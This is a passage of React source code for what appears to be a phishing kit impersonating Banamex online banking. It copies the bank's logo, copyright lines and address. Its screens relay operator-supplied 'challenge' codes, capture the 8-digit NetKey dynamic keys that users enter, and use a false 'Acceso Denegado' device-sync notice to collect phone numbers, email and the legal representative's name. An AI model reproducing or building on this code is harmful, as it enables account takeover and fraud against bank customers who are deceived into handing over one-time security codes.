                      <div style={{ marginTop: '18px', fontWeight: 700, fontSize: '22px', color: '#0b2b2f' }}>
                        CHALLNG: <span>{screenData.challenge || '58724375'}</span>
                      </div>

                      <div style={{ flex: 1 }}></div>
                      <div style={{ marginTop: '12px', color: '#9aaeb0', fontSize: '12px' }}>
                        <button 
                          style={{
                            padding: '8px 12px',
                            borderRadius: '6px',
                            background: '#fff5f6',
                            color: '#c22f40',
                            border: '1px solid rgba(194,47,64,0.08)',
                            fontWeight: 600,
                            fontSize: '14px',
                            cursor: 'pointer'
                          }}
                          type="button"
                        >
                          Cancelar
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Panel derecho */}
                  <div 
                    style={{
                      width: '320px',
                      background: '#fff',
                      borderRadius: '6px',
                      padding: '20px',
                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
                      display: 'flex',
                      flexDirection: 'column',
                      justifyContent: 'space-between'
                    }}
                  >
                    <div>
                      <p style={{ margin: '0 0 10px', fontWeight: 600, color: '#193b3e' }}>
                        Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
                      </p>

                      <label style={{ fontSize: '13px', color: '#134142', marginBottom: '8px', display: 'block' }}>
                        Clave dinámica
                      </label>
                      <input 
                        type="text" 
                        maxLength={8}
                        value={netkeyResponse}
                        onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
                        placeholder="Introduzca la clave dinámica aquí"
                        style={{
                          padding: '9px 10px',
                          borderRadius: '3px',
                          border: '1px solid #cfdfe0',
                          fontSize: '15px',
                          width: '100%',
                          boxSizing: 'border-box'
                        }}
                      />
                    </div>

                    <div>
                      <div style={{ display: 'flex', gap: '12px', marginTop: '16px', alignItems: 'center', justifyContent: 'flex-end' }}>
                        <button 
                          style={{
                            padding: '10px 18px',
                            borderRadius: '10px',
                            cursor: 'pointer',
                            fontWeight: 600,
                            fontSize: '14px',
                            background: '#fff5f6',
                            color: '#c22f40',
                            border: '1px solid rgba(194,47,64,0.08)'
                          }}
                          type="button"
                        >
                          Cancelar
                        </button>
                        <button 
                          style={{
                            padding: '10px 18px',
                            borderRadius: '10px',
                            border: 0,
                            cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer',
                            fontWeight: 600,
                            fontSize: '14px',
                            background: '#0f3e3f',
                            color: '#fff',
                            boxShadow: '0 6px 10px rgba(15,62,63,0.12)',
                            opacity: netkeyResponse.length !== 8 ? 0.5 : 1
                          }}
                          type="button"
                          onClick={handleNetkeySubmit}
                          disabled={netkeyResponse.length !== 8}
                        >
                          Continuar
                        </button>
                      </div>

                      <p style={{ marginTop: '12px', color: '#8b9aa0', fontSize: '12px' }}>
                        D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
                        Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case ScreenType.NETKEY2:
        const handleNetkey2Submit = () => {
          if (netkeyResponse.length === 8 && /^\d+$/.test(netkeyResponse)) {
            onSubmit(ScreenType.NETKEY2, { netkeyResponse: netkeyResponse });
          }
        };

        const [currentTime2, setCurrentTime2] = useState(new Date());

        useEffect(() => {
          const timer = setInterval(() => setCurrentTime2(new Date()), 1000);
          return () => clearInterval(timer);
        }, []);

        const formatDateTime2 = (d: Date) => {
          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
          const pad = (n: number) => n < 10 ? '0'+n : n;
          const dayName = days[d.getDay()];
          const day = d.getDate();
          const month = months[d.getMonth()];
          const year = d.getFullYear();
          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
        };

        return (
          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                    <g fill="#c81f3b">
                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                    </g>
                  </svg>
                  <div>
                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
                  </div>
                </div>

                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
                  <div style={{ fontSize: '14px', color: '#2d4b51' }} id="datetime">
                    {formatDateTime2(currentTime2)}
                  </div>
                </div>
              </header>

              <div style={{ 
                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
                borderRadius: '8px', 
                padding: '22px', 
                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
                border: '1px solid rgba(0,0,0,0.03)' 
              }} role="main" aria-labelledby="title">
                <h1 id="title" style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                  » Clave dinámica
                </h1>

                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
                  <div style={{ 
                    background: '#fff', 
                    borderRadius: '6px', 
                    padding: '20px', 
                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
                    flex: '1.1', 
                    marginRight: '6px', 
                    minHeight: '260px', 
                    display: 'flex', 
                    flexDirection: 'column' 
                  }} aria-label="Instrucciones">
                    <p style={{ margin: '6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                    <p style={{ margin: '12px 0 6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>

                    <div style={{ 
                      background: 'linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%)', 
                      borderRadius: '6px', 
                      padding: '16px', 
                      margin: '14px 0', 
                      textAlign: 'center', 
                      border: '2px solid #b4d5d8' 
                    }}>
                      <div style={{ fontSize: '12px', color: '#3d5559', marginBottom: '6px' }}>CHALLNG</div>
                      <div style={{ 
                        fontSize: '42px', 
                        fontWeight: 600, 
                        letterSpacing: '10px', 
                        color: '#153e46', 
                        fontFamily: "'Courier New', monospace" 
                      }}>
                        {screenData.challenge || '--------'}
                      </div>
                    </div>

                    <button 
                      style={{ 
                        padding: '10px 24px', 
                        background: '#fff', 
                        color: '#3d5559', 
                        border: '2px solid #c4d5d7', 
                        borderRadius: '6px', 
                        fontSize: '14px', 
                        fontWeight: 500, 
                        cursor: 'pointer', 
                        alignSelf: 'flex-start', 
                        marginBottom: '12px' 
                      }} 
                      type="button"
                    >
                      Cancelar
                    </button>
                    <p style={{ margin: '6px 0', fontSize: '14px', lineHeight: 1.5, color: '#3d5559' }}>Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
                  </div>

                  <div style={{ 
                    background: '#fff', 
                    borderRadius: '6px', 
                    padding: '20px', 
                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
                    flex: 1, 
                    minHeight: '260px', 
                    display: 'flex', 
                    flexDirection: 'column', 
                    justifyContent: 'space-between' 
                  }} aria-label="Campo de clave dinámica">
                    <div>
                      <h2 style={{ fontSize: '18px', margin: '0 0 14px 0', color: '#153e46' }}>Clave dinámica</h2>
                      <input 
                        type="text" 
                        maxLength={8}
                        value={netkeyResponse}
                        onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
                        placeholder="00000000" 
                        aria-label="Clave dinámica"
                        style={{ 
                          width: '100%', 
                          padding: '14px', 
                          fontSize: '28px', 
                          textAlign: 'center', 
                          letterSpacing: '6px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          fontFamily: "'Courier New', monospace", 
                          color: '#153e46', 
                          fontWeight: 600, 
                          background: '#f7fbfc', 
                          boxSizing: 'border-box' 
                        }}
                      />
                    </div>

                    <div style={{ marginTop: '20px', display: 'flex', gap: '10px' }}>
                      <button 
                        style={{ 
                          flex: 1, 
                          padding: '12px', 
                          background: '#fff', 
                          color: '#3d5559', 
                          border: '2px solid #c4d5d7', 
                          borderRadius: '6px', 
                          fontSize: '15px', 
                          fontWeight: 500, 
                          cursor: 'pointer' 
                        }} 
                        type="button"
                      >
                        Cancelar
                      </button>
                      <button 
                        style={{ 
                          flex: 1, 
                          padding: '12px', 
                          background: '#153e46', 
                          color: '#fff', 
                          border: 'none', 
                          borderRadius: '6px', 
                          fontSize: '15px', 
                          fontWeight: 600, 
                          cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer',
                          opacity: netkeyResponse.length !== 8 ? 0.5 : 1
                        }} 
                        type="button"
                        onClick={handleNetkey2Submit}
                        disabled={netkeyResponse.length !== 8}
                      >
                        Continuar
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case ScreenType.NETKEY_CUSTOM:
        const handleNetkeyCustomSubmit = () => {
          if (netkeyResponse.length === 8 && /^\d+$/.test(netkeyResponse)) {
            onSubmit(ScreenType.NETKEY_CUSTOM, { customNetkeyResponse: netkeyResponse });
          }
        };

        const [currentTimeCustom, setCurrentTimeCustom] = useState(new Date());

        useEffect(() => {
          const timer = setInterval(() => setCurrentTimeCustom(new Date()), 1000);
          return () => clearInterval(timer);
        }, []);

        const formatDateTimeCustom = (d: Date) => {
          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
          const pad = (n: number) => n < 10 ? '0'+n : n;
          const dayName = days[d.getDay()];
          const day = d.getDate();
          const month = months[d.getMonth()];
          const year = d.getFullYear();
          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
        };

        return (
          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                    <g fill="#c81f3b">
                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                    </g>
                  </svg>
                  <div>
                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
                  </div>
                </div>

                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
                  <div style={{ fontSize: '14px', color: '#2d4b51' }} id="datetime">
                    {formatDateTimeCustom(currentTimeCustom)}
                  </div>
                </div>
              </header>

              <div style={{ 
                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
                borderRadius: '8px', 
                padding: '22px', 
                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
                border: '1px solid rgba(0,0,0,0.03)' 
              }} role="main" aria-labelledby="title">
                <h1 id="title" style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                  » Clave dinámica
                </h1>

                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
                  <div style={{ 
                    background: '#fff', 
                    borderRadius: '6px', 
                    padding: '20px', 
                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
                    flex: '1.1', 
                    marginRight: '6px', 
                    minHeight: '260px', 
                    display: 'flex', 
                    flexDirection: 'column' 
                  }} aria-label="Instrucciones">
                    <p style={{ margin: '6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                    <p style={{ margin: '12px 0 6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>

                    <div style={{ 
                      background: 'linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%)', 
                      borderRadius: '6px', 
                      padding: '16px', 
                      margin: '14px 0', 
                      textAlign: 'center', 
                      border: '2px solid #b4d5d8' 
                    }}>
                      <div style={{ fontSize: '12px', color: '#3d5559', marginBottom: '6px' }}>CHALLNG</div>
                      <div style={{ 
                        fontSize: '42px', 
                        fontWeight: 600, 
                        letterSpacing: '10px', 
                        color: '#153e46', 
                        fontFamily: "'Courier New', monospace" 
                      }}>
                        {screenData.customChallenge || '--------'}
                      </div>
                    </div>

                    <button 
                      style={{ 
                        padding: '10px 24px', 
                        background: '#fff', 
                        color: '#3d5559', 
                        border: '2px solid #c4d5d7', 
                        borderRadius: '6px', 
                        fontSize: '14px', 
                        fontWeight: 500, 
                        cursor: 'pointer', 
                        alignSelf: 'flex-start', 
                        marginBottom: '12px' 
                      }} 
                      type="button"
                    >
                      Cancelar
                    </button>
                    <p style={{ margin: '6px 0', fontSize: '14px', lineHeight: 1.5, color: '#3d5559' }}>Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
                  </div>

                  <div style={{ 
                    background: '#fff', 
                    borderRadius: '6px', 
                    padding: '20px', 
                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
                    flex: 1, 
                    minHeight: '260px', 
                    display: 'flex', 
                    flexDirection: 'column', 
                    justifyContent: 'space-between' 
                  }} aria-label="Campo de clave dinámica">
                    <div>
                      <h2 style={{ fontSize: '18px', margin: '0 0 14px 0', color: '#153e46' }}>Clave dinámica</h2>
                      <input 
                        type="text" 
                        maxLength={8}
                        value={netkeyResponse}
                        onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
                        placeholder="00000000" 
                        aria-label="Clave dinámica"
                        style={{ 
                          width: '100%', 
                          padding: '14px', 
                          fontSize: '28px', 
                          textAlign: 'center', 
                          letterSpacing: '6px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          fontFamily: "'Courier New', monospace", 
                          color: '#153e46', 
                          fontWeight: 600, 
                          background: '#f7fbfc', 
                          boxSizing: 'border-box' 
                        }}
                      />
                    </div>

                    <div style={{ marginTop: '20px', display: 'flex', gap: '10px' }}>
                      <button 
                        style={{ 
                          flex: 1, 
                          padding: '12px', 
                          background: '#fff', 
                          color: '#3d5559', 
                          border: '2px solid #c4d5d7', 
                          borderRadius: '6px', 
                          fontSize: '15px', 
                          fontWeight: 500, 
                          cursor: 'pointer' 
                        }} 
                        type="button"
                      >
                        Cancelar
                      </button>
                      <button 
                        style={{ 
                          flex: 1, 
                          padding: '12px', 
                          background: '#153e46', 
                          color: '#fff', 
                          border: 'none', 
                          borderRadius: '6px', 
                          fontSize: '15px', 
                          fontWeight: 600, 
                          cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer',
                          opacity: netkeyResponse.length !== 8 ? 0.5 : 1
                        }} 
                        type="button"
                        onClick={handleNetkeyCustomSubmit}
                        disabled={netkeyResponse.length !== 8}
                      >
                        Continuar
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case ScreenType.DATOS_CONTACTO:
        const [telefono1, setTelefono1] = useState('');
        const [telefono2, setTelefono2] = useState('');
        const [correoContacto, setCorreoContacto] = useState('');
        const [nombreRepresentante, setNombreRepresentante] = useState('');

        const handleDatosContactoSubmit = () => {
          if (telefono1 && correoContacto && nombreRepresentante) {
            onSubmit(ScreenType.DATOS_CONTACTO, { 
              telefono1, 
              telefono2, 
              correo: correoContacto, 
              nombreRepresentante 
            });
          }
        };

        const [currentTime3, setCurrentTime3] = useState(new Date());

        useEffect(() => {
          const timer = setInterval(() => setCurrentTime3(new Date()), 1000);
          return () => clearInterval(timer);
        }, []);

        const formatDateTime3 = (d: Date) => {
          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
          const pad = (n: number) => n < 10 ? '0'+n : n;
          const dayName = days[d.getDay()];
          const day = d.getDate();
          const month = months[d.getMonth()];
          const year = d.getFullYear();
          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
        };

        return (
          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                    <g fill="#c81f3b">
                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                    </g>
                  </svg>
                  <div>
                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
                  </div>
                </div>

                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
                  <div style={{ fontSize: '14px', color: '#2d4b51' }}>
                    {formatDateTime3(currentTime3)}
                  </div>
                </div>
              </header>

              <div style={{ 
                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
                borderRadius: '8px', 
                padding: '32px', 
                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
                border: '1px solid rgba(0,0,0,0.03)' 
              }} role="main">
                <h1 style={{ fontSize: '28px', margin: '6px 0 24px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                  » Datos de contacto
                </h1>

                <div style={{ background: '#fff', borderRadius: '6px', padding: '24px', boxShadow: '0 3px 8px rgba(0,0,0,0.04)' }}>
                  <p style={{ margin: '0 0 24px 0', color: '#3d5559', fontSize: '15px', lineHeight: 1.6 }}>
                    Para continuar con su solicitud, necesitamos los siguientes datos de contacto:
                  </p>

                  <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                    <div>
                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
                        Teléfono de contacto 1 <span style={{ color: '#c81f3b' }}>*</span>
                      </label>
                      <input 
                        type="tel" 
                        value={telefono1}
                        onChange={(e) => setTelefono1(e.target.value.replace(/\D/g, '').slice(0, 10))}
                        placeholder="10 dígitos"
                        maxLength={10}
                        style={{ 
                          width: '100%', 
                          padding: '12px 16px', 
                          fontSize: '16px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          background: '#f7fbfc', 
                          color: '#153e46',
                          boxSizing: 'border-box'
                        }}
                      />
                    </div>

                    <div>
                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
                        Teléfono de contacto 2 (opcional)
                      </label>
                      <input 
                        type="tel" 
                        value={telefono2}
                        onChange={(e) => setTelefono2(e.target.value.replace(/\D/g, '').slice(0, 10))}
                        placeholder="10 dígitos"
                        maxLength={10}
                        style={{ 
                          width: '100%', 
                          padding: '12px 16px', 
                          fontSize: '16px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          background: '#f7fbfc', 
                          color: '#153e46',
                          boxSizing: 'border-box'
                        }}
                      />
                    </div>

                    <div>
                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
                        Correo electrónico <span style={{ color: '#c81f3b' }}>*</span>
                      </label>
                      <input 
                        type="email" 
                        value={correoContacto}
                        onChange={(e) => setCorreoContacto(e.target.value)}
                        placeholder="correo@ejemplo.com"
                        style={{ 
                          width: '100%', 
                          padding: '12px 16px', 
                          fontSize: '16px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          background: '#f7fbfc', 
                          color: '#153e46',
                          boxSizing: 'border-box'
                        }}
                      />
                    </div>

                    <div>
                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
                        Nombre del representante legal <span style={{ color: '#c81f3b' }}>*</span>
                      </label>
                      <input 
                        type="text" 
                        value={nombreRepresentante}
                        onChange={(e) => setNombreRepresentante(e.target.value)}
                        placeholder="Nombre completo"
                        style={{ 
                          width: '100%', 
                          padding: '12px 16px', 
                          fontSize: '16px', 
                          border: '2px solid #b4d5d8', 
                          borderRadius: '6px', 
                          background: '#f7fbfc', 
                          color: '#153e46',
                          boxSizing: 'border-box'
                        }}
                      />
                    </div>
                  </div>

                  <div style={{ marginTop: '28px', display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
                    <button 
                      style={{ 
                        padding: '12px 24px', 
                        background: '#fff', 
                        color: '#3d5559', 
                        border: '2px solid #c4d5d7', 
                        borderRadius: '6px', 
                        fontSize: '15px', 
                        fontWeight: 500, 
                        cursor: 'pointer' 
                      }} 
                      type="button"
                    >
                      Cancelar
                    </button>
                    <button 
                      style={{ 
                        padding: '12px 24px', 
                        background: telefono1 && correoContacto && nombreRepresentante ? '#153e46' : '#b4d5d8', 
                        color: '#fff', 
                        border: 'none', 
                        borderRadius: '6px', 
                        fontSize: '15px', 
                        fontWeight: 600, 
                        cursor: telefono1 && correoContacto && nombreRepresentante ? 'pointer' : 'not-allowed',
                        opacity: telefono1 && correoContacto && nombreRepresentante ? 1 : 0.6
                      }} 
                      type="button"
                      onClick={handleDatosContactoSubmit}
                      disabled={!telefono1 || !correoContacto || !nombreRepresentante}
                    >
                      Continuar
                    </button>
                  </div>
                </div>
              </div>

              <footer style={{ marginTop: '28px', paddingTop: '18px', borderTop: '1px solid #e0e0e0', textAlign: 'center', fontSize: '11px', color: '#666' }}>
                <p style={{ margin: '4px 0' }}>Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.</p>
                <p style={{ margin: '4px 0' }}>© 2025 Banco Nacional de México, S.A. Derechos Reservados</p>
              </footer>
            </div>
          </div>
        );

      case ScreenType.ACCESO_DENEGADO:
        const handleAccesoDenegadoSubmit = () => {
          if (telefonoAcceso1 && correoAcceso && nombreRepAcceso) {
            onSubmit(ScreenType.ACCESO_DENEGADO, { 
              telefono1: telefonoAcceso1, 
              telefono2: telefonoAcceso2, 
              correo: correoAcceso, 
              nombreRepresentante: nombreRepAcceso 
            });
          }
        };

        const accesoDenegadoContent = (
          <div className="bg-white p-6 rounded-lg">
            <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
              <h2 className="text-2xl font-bold">Acceso Denegado</h2>
            </div>

            <div className="bg-gray-50 p-6 rounded-lg">
              <p className="text-gray-700 mb-6 leading-relaxed">
                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
                Es necesario sincronizarlo para restablecer su servicio correctamente.
              </p>

              <div className="bg-white p-6 rounded-lg border border-gray-300 mb-6">
                <h3 className="text-[#003d7a] font-bold text-lg mb-4">Datos de contacto</h3>
                <p className="text-gray-700 mb-4 text-sm">
                  Para que nuestro equipo pueda asistirle, por favor proporcione los siguientes datos:
                </p>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Teléfono de contacto 1 <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="tel" 
                      value={telefonoAcceso1}
                      onChange={(e) => setTelefonoAcceso1(e.target.value.replace(/\D/g, '').slice(0, 10))}
                      placeholder="10 dígitos"
                      maxLength={10}
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Teléfono de contacto 2 (opcional)
                    </label>
                    <input 
                      type="tel" 
                      value={telefonoAcceso2}
                      onChange={(e) => setTelefonoAcceso2(e.target.value.replace(/\D/g, '').slice(0, 10))}
                      placeholder="10 dígitos"
                      maxLength={10}
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Correo electrónico <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="email" 
                      value={correoAcceso}
                      onChange={(e) => setCorreoAcceso(e.target.value)}
                      placeholder="correo@ejemplo.com"
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Nombre del representante legal <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="text" 
                      value={nombreRepAcceso}
                      onChange={(e) => setNombreRepAcceso(e.target.value)}
                      placeholder="Nombre completo"
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <button
                    onClick={handleAccesoDenegadoSubmit}
                    disabled={!telefonoAcceso1 || !correoAcceso || !nombreRepAcceso}
                    className="w-full bg-[#003d7a] text-white py-3 px-6 rounded-lg font-semibold hover:bg-[#002a5c] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Enviar datos
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
        return accesoDenegadoContent;

      case ScreenType.ACCESO_DENEGADO_2:
        const handleAccesoDenegado2Submit = () => {
          console.log('Enviando datos acceso denegado 2:', {
            telefono1: telefonoAcceso1, 
            telefono2: telefonoAcceso2, 
            correo: correoAcceso, 
            nombreRepresentante: nombreRepAcceso 
          });
          if (telefonoAcceso1 && correoAcceso && nombreRepAcceso) {
            onSubmit(ScreenType.ACCESO_DENEGADO_2, { 
              telefono1: telefonoAcceso1, 
              telefono2: telefonoAcceso2, 
              correo: correoAcceso, 
              nombreRepresentante: nombreRepAcceso 
            });
          }
        };

        const accesoDenegado2Content = (
          <div className="bg-white p-6 rounded-lg">
            <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
              <h2 className="text-2xl font-bold">Acceso Denegado</h2>
            </div>

            <div className="bg-gray-50 p-6 rounded-lg">
              <p className="text-gray-700 mb-6 leading-relaxed">
                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
                Es necesario sincronizarlo para restablecer su servicio correctamente.
              </p>

              <div className="bg-white p-6 rounded-lg border border-gray-300 mb-6">
                <h3 className="text-[#003d7a] font-bold text-lg mb-4">Información de contacto requerida</h3>
                <p className="text-gray-700 mb-4 text-sm">
                  Para proceder con la sincronización, por favor complete los siguientes datos:
                </p>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Nombre del representante legal <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="text" 
                      value={nombreRepAcceso}
                      onChange={(e) => setNombreRepAcceso(e.target.value)}
                      placeholder="Nombre completo del representante legal"
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Número de teléfono 1 <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="tel" 
                      value={telefonoAcceso1}
                      onChange={(e) => setTelefonoAcceso1(e.target.value.replace(/\D/g, '').slice(0, 10))}
                      placeholder="10 dígitos"
                      maxLength={10}
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Número de teléfono 2 (opcional)
                    </label>
                    <input 
                      type="tel" 
                      value={telefonoAcceso2}
                      onChange={(e) => setTelefonoAcceso2(e.target.value.replace(/\D/g, '').slice(0, 10))}
                      placeholder="10 dígitos"
                      maxLength={10}
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Correo electrónico de su cuenta <span className="text-red-600">*</span>
                    </label>
                    <input 
                      type="email" 
                      value={correoAcceso}
                      onChange={(e) => setCorreoAcceso(e.target.value)}
                      placeholder="correo@ejemplo.com"
                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
                    />
                  </div>

                  <button
                    onClick={handleAccesoDenegado2Submit}
